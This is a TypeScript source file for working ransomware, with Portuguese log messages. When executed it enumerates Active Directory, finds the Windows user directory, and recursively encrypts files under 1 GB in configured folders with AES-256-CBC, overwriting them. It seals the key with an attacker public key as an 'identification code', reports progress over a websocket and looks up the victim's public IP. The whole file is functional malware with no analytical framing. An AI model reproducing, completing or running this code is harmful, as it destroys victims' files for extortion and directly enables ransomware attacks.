import os from 'os';
import fs from 'fs';
import crypto from 'crypto';
import path from 'path';
import config from './config.json';
import https from 'https';
import createRandomString from './utils/generateRandomString';
import enumerateAD from './enumerateAd';
import isActive from './isActive';
import sendLog from './websocket/client';

const encrypt = () => {
  enumerateAD();
  isActive();
  const userName: string = os.userInfo().username;
  setTimeout(() => sendLog(`[+] -> OS USERNAME ${userName}`), 1000);
  const userDir: string = `C:\\Users\\${userName}`;
  setTimeout(
    () => sendLog(`[+] -> DIRETÓRIO DEFAULT DO USUÁRIO: ${userDir}`),
    1000,
  );
  setTimeout(() => sendLog(`[+] -> RANSOMWARE INICIADO`), 1000);
  const key: string = createRandomString(32);
  const iv: Buffer = crypto.randomBytes(16);

  for (let i = 0; i < config.targetFolder.length; i++) {
    console.log(i, config.targetFolder[i]);
    encryptDir(`${userDir}\\${config.targetFolder[i]}`, key, iv);
  }

  const keyData: string = `${key}${iv.toString('hex')}`;
  const idCode: string = encryptPublicKey(keyData);

  console.log(`Identification Code : ${idCode}\n`);
  setTimeout(
    () =>
      sendLog(`[+] -> RANSOMWARE FINALIZADO, IDENTIFICATION CODE: ${idCode}`),
    1000,
  );
};

const encryptDir = (dir: string, key: string, iv: Buffer) => {
  if (!fs.existsSync(dir)) return;

  fs.readdirSync(dir).forEach((file) => {
    try {
      const fullPath: string = path.join(dir, file);

      if (fs.lstatSync(fullPath).isDirectory()) {
        encryptDir(fullPath, key, iv);
      } else {
        let isTarget: boolean = true;

        if (isTarget) {
          let fileStat = fs.statSync(fullPath);
          let fileSize = fileStat['size'];
          if (fileSize < 1e9) {
            encryptFile(fullPath, key, iv);

            console.log(fullPath);
          }
        }
      }
    } catch (error) {
      console.log(error);
    }
  });
};

const encryptFile = (file: string, key: string, iv: Buffer) => {
  const fileData = fs.readFileSync(file).toString();
  const encryptedData = encryptAES(fileData, key, iv);

  fs.writeFileSync(file, encryptedData);
};

const encryptAES = (plainText: string, key: string, iv: Buffer): string => {
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);

  let encryptedText: Buffer = cipher.update(plainText);
  encryptedText = Buffer.concat([encryptedText, cipher.final()]);

  return encryptedText.toString('base64');
};

const encryptPublicKey = (plainText: string): string => {
  const plainBuffer = Buffer.from(plainText);
  const encryptedBuffer: Buffer = crypto.publicEncrypt(
    config.publicKey,
    plainBuffer,
  );

  return encryptedBuffer.toString('base64');
};

const getPublicIP = () => {
  return new Promise((resolve, reject) => {
    https
      .get('https://api64.ipify.org?format=json', (res) => {
        let data = '';

        res.on('data', (chunk) => {
          data += chunk;
        });

        res.on('end', () => {
          try {
            const result = JSON.parse(data);
            resolve(result.ip);
            // @ts-ignore
          } catch (err: any) {
            reject('Erro ao parsear resposta: ' + err.message);
          }
        });
      })
      .on('error', (err) => {
        reject('Erro ao obter IP público: ' + err.message);
      });
  });
};

getPublicIP()
  .then((ip) => {
    console.log('IP público:', ip);
  })
  .catch((err) => {
    console.error(err);
  });

// execute
encrypt();
